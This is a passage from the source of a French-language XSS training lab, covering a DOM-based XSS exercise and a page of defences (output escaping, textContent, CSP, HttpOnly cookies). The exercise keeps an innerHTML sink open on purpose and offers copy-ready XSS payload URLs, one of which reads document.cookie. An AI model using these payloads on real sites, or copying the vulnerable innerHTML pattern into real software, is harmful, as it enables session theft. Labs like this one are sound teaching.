              <p style="font-weight:600; color:var(--danger); margin-bottom:6px;">XSS Réfléchi / Stocké</p>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Payload → Serveur → Page HTML → Navigateur</p>
              <p class="text-sm" style="color:var(--muted);">Le serveur génère du HTML avec le payload dedans.</p>
            </div>
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:14px;">
              <p style="font-weight:600; color:var(--info); margin-bottom:6px;">XSS DOM-Based</p>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Payload → Navigateur (JS lit l'URL) → DOM modifié</p>
              <p class="text-sm" style="color:var(--muted);">Le serveur ne voit jamais le payload. Tout se passe côté client.</p>
            </div>
          </div>
          <div class="alert alert-info">
            💡 Le payload est placé dans le <strong>fragment d'URL</strong> (après le <code>#</code>). Cette partie n'est jamais envoyée au serveur par le navigateur.
          </div>
        </div>

        <div class="card">
          <div class="exercise-header">
            <div class="exercise-title">🏷️ Widget de personnalisation (vulnérable)</div>
            <div class="exercise-status">
              <?php if ($progress['ex4']): ?>
                <div class="status-pill status-solved">✅ Réussi</div>
              <?php else: ?>
                <div class="status-pill status-unsolved">○ À faire</div>
              <?php endif; ?>
            </div>
          </div>

          <div class="alert alert-warn">
            ⚠️ <strong>Objectif :</strong> Déclencher un XSS en ajoutant un payload dans la barre d'URL après le <code>#</code>.
          </div>

          <ol class="step-list" style="margin-bottom:16px;">
            <li>Regarde l'URL actuelle dans ton navigateur. Elle ressemble à : <code><?= htmlspecialchars($base_url) ?>/?page=dom</code></li>
            <li>Clique sur le payload ci-dessous pour voir l'URL à taper, puis <strong>copie-la</strong>.</li>
            <li><strong>Colle cette URL dans la barre d'adresse</strong> de ton navigateur et appuie sur Entrée.</li>
            <li>La popup apparaît ? Tu as réussi !</li>
          </ol>

          <div class="payload-box">
            <div class="payload-label">🌐 URLs d'attaque à copier dans la barre d'adresse</div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)"><?= htmlspecialchars($base_url) ?>/?page=dom#&lt;img src=x onerror=alert('DOM XSS !')&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)"><?= htmlspecialchars($base_url) ?>/?page=dom#&lt;svg onload=alert(document.cookie)&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
          </div>

          <hr class="divider">

          <p style="font-size:0.85em; color:var(--muted); margin-bottom:8px;">Widget de bienvenue (lit le <code>#hash</code> de l'URL) :</p>
          <div id="dom-output">
            <span style="color:var(--muted);">En attente d'un fragment d'URL...</span>
          </div>

          <script>
            // ⚠️ INTENTIONNELLEMENT VULNÉRABLE : innerHTML avec des données non filtrées
            (function() {
              var hash = window.location.hash.slice(1);
              if (hash) {
                var decoded = decodeURIComponent(hash);
                document.getElementById('dom-output').innerHTML = '👋 Bienvenue, ' + decoded + ' !';

                // Notify server that ex4 was triggered (if contains a payload)
                if (/<|onerror|onload|javascript:/i.test(decoded)) {
                  fetch('?mark_ex4=1').catch(function() {});
                  setTimeout(function() {
                    document.querySelectorAll('.status-pill').forEach(function(el) {
                      el.className = 'status-pill status-solved';
                      el.textContent = '✅ Réussi';
                    });
                  }, 500);
                }
              } else {
                document.getElementById('dom-output').textContent = 'Ajoute #TonNom dans l\'URL pour un message personnalisé.';
              }
            })();
          </script>
        </div>

        <div class="card">
          <div class="card-title">🔬 Analyse du code vulnérable</div>
          <pre>
// ⚠️ VULNÉRABLE — Le JS lit le hash et l'insère via innerHTML
var hash = window.location.hash.slice(1);
document.getElementById('dom-output').innerHTML =
    'Bienvenue, ' + decodeURIComponent(hash) + ' !';

// Si hash = &lt;img src=x onerror=alert()&gt;
// → innerHTML parse le HTML et exécute le handler onerror</pre>

          <pre>
// ✅ SÉCURISÉ — textContent encode automatiquement le HTML
document.getElementById('dom-output').textContent =
    'Bienvenue, ' + decodeURIComponent(hash) + ' !';

// ✅ OU — Créer le noeud texte manuellement
var textNode = document.createTextNode(decodeURIComponent(hash));
document.getElementById('dom-output').appendChild(textNode);</pre>

          <div class="flex-gap" style="margin-top:16px;">
            <a href="?page=defense" class="btn btn-primary">🛡️ Voir les défenses →</a>
          </div>
        </div>

      <?php elseif ($page === 'defense'): ?>
        <!-- ──────────────── DEFENSE PAGE ──────────────── -->
        <div class="page-title">🛡️ Comment se protéger ?</div>
        <div class="page-subtitle">Maintenant que tu connais les attaques, voici les défenses.</div>

        <?php
        $all_done = $solved_count === 4;
        ?>
        <?php if ($all_done): ?>
          <div class="alert alert-success">
            🎉 <strong>Félicitations !</strong> Tu as terminé tous les exercices du lab.
          </div>

        <?php elseif ($solved_count > 0): ?>
          <div class="alert alert-info">
            Tu as complété <?= $solved_count ?>/4 exercices. Reviens terminer les autres !
          </div>
        <?php endif; ?>
        <div class="card">
          <div class="card-title">1. 🥇 Règle principale : Échapper toutes les sorties</div>
          <p class="text-sm" style="color:var(--muted); line-height:1.8; margin-bottom:12px;">
            Chaque fois qu'une donnée utilisateur est affichée dans le HTML, elle doit être transformée pour qu'elle ne puisse pas être interprétée comme du HTML ou du JavaScript.
          </p>
          <pre>
// PHP — htmlspecialchars() transforme les caractères dangereux
echo htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
// &lt; → &amp;lt;    &gt; → &amp;gt;    " → &amp;quot;    ' → &amp;#039;

// JavaScript — utiliser textContent au lieu de innerHTML
element.textContent = userInput;       // ✅ sûr
element.innerHTML   = userInput;       // ❌ dangereux</pre>
        </div>

        <div class="card">
          <div class="card-title">2. 🔒 Content Security Policy (CSP)</div>
          <p class="text-sm" style="color:var(--muted); line-height:1.8; margin-bottom:12px;">
            La CSP est un en-tête HTTP qui indique au navigateur quels scripts sont autorisés à s'exécuter. Même si un XSS est présent, le navigateur bloquera les scripts non autorisés.
          </p>
          <pre>
# En-tête HTTP à ajouter (PHP) :
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

# Effet : si un attaquant injecte &lt;script&gt;alert()&lt;/script&gt;
# Le navigateur bloque l'exécution et affiche une erreur dans la console.</pre>
        </div>

        <div class="card">
          <div class="card-title">3. 🍪 Protéger les cookies avec HttpOnly</div>
          <pre>
// PHP — rendre un cookie inaccessible depuis JavaScript
setcookie('session_token', $token, [
    'httponly' => true,    // Empêche document.cookie de le voir
    'secure'   => true,    // HTTPS uniquement
    'samesite' => 'Strict' // Protection contre CSRF
]);

// Résultat : même en cas de XSS, les cookies restent invisibles pour le JS.</pre>
        </div>

        <div class="card">
          <div class="card-title">📊 Récapitulatif des mesures de protection</div>
          <div style="overflow-x:auto;">
            <table style="width:100%; border-collapse:collapse; font-size:0.85em;">
              <thead>
                <tr style="background:var(--code-bg);">
                  <th style="padding:10px; text-align:left; border-bottom:1px solid var(--border);">Mesure</th>
                  <th style="padding:10px; text-align:left; border-bottom:1px solid var(--border);">Protège contre</th>
                  <th style="padding:10px; text-align:left; border-bottom:1px solid var(--border);">Priorité</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><code>htmlspecialchars()</code></td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Reflected & Stored XSS</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><span class="tag tag-danger">CRITIQUE</span></td>
                </tr>
                <tr>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><code>textContent</code> vs <code>innerHTML</code></td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">DOM-Based XSS</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><span class="tag tag-danger">CRITIQUE</span></td>
                </tr>
                <tr>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Content-Security-Policy</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Tous types (couche sup.)</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><span class="tag tag-warn">ÉLEVÉ</span></td>
                </tr>
                <tr>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Cookie <code>HttpOnly</code></td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Vol de session</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><span class="tag tag-danger">CRITIQUE</span></td>
                </tr>
                <tr>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Validation des entrées</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);">Réduction de surface</td>
                  <td style="padding:10px; border-bottom:1px solid var(--border);"><span class="tag tag-warn">ÉLEVÉ</span></td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>

      <?php endif; ?>

    </main>
  </div>

  <script>
    // ── Copy payload to clipboard ────────────────────────────────────────
    function copyPayload(el) {
      var text = el.textContent.trim();
      navigator.clipboard.writeText(text).then(function() {
        var btn = el.nextElementSibling;
        if (btn && btn.classList.contains('copy-btn')) {
          var orig = btn.textContent;
          btn.textContent = '✅ Copié !';
          btn.classList.add('copy-ok');
          setTimeout(function() {
            btn.textContent = orig;
            btn.classList.remove('copy-ok');
          }, 1500);
        }
      }).catch(function() {
        // Fallback
        var ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
      });
    }

    // ── Toggle cookie panel ───────────────────────────────────────────────
    function toggleCookiePanel() {
      var body = document.getElementById('cookie-panel-body');
      var chevron = document.getElementById('panel-chevron');
      if (body.style.display === 'none') {
        body.style.display = '';
        chevron.textContent = '▲';
      } else {
        body.style.display = 'none';
        chevron.textContent = '▼';
      }
    }

    // ── Refresh progress from server ──────────────────────────────────────
    function refreshProgress() {
      fetch('?api=progress').then(r => r.json()).then(function(p) {
        var count = Object.values(p).filter(Boolean).length;
        var fill = document.getElementById('prog-fill');
        var label = document.getElementById('prog-count');
        if (fill) fill.style.width = (count / 4 * 100) + '%';
        if (label) label.textContent = count + '/4 exercices';
      }).catch(function() {});
    }

    // ── Refresh cookie panel ──────────────────────────────────────────────
    function refreshCookies() {
      fetch('?api=cookies').then(r => r.json()).then(function(cookies) {
        var count = cookies.length;
        var badge = document.getElementById('cookie-count');
        if (badge) badge.textContent = count;

        var panel = document.getElementById('live-cookie-panel');
        if (panel && count > 0) {
          panel.innerHTML = cookies.reverse().map(function(c) {
            return '<div class="comment" style="border-color:rgba(34,197,94,.4);">' +
              '<div class="comment-author">⏱️ ' + c.time + '</div>' +
              '<div class="comment-body" style="font-family:monospace;font-size:0.8em;color:var(--success);">' + c.data + '</div>' +
              '</div>';
          }).join('');
        }

        var sidebar = document.getElementById('cookie-panel-body');
        if (sidebar && count > 0) {
          sidebar.innerHTML = cookies.map(function(c) {
            return '<div class="cookie-item"><span class="cookie-time">' + c.time + '</span>' + c.data + '</div>';
          }).join('');
        }
      }).catch(function() {});
    }

    // Auto-refresh every 3 seconds
    setInterval(function() {
      refreshProgress();
      refreshCookies();
    }, 3000);
  </script>
</body>

</html>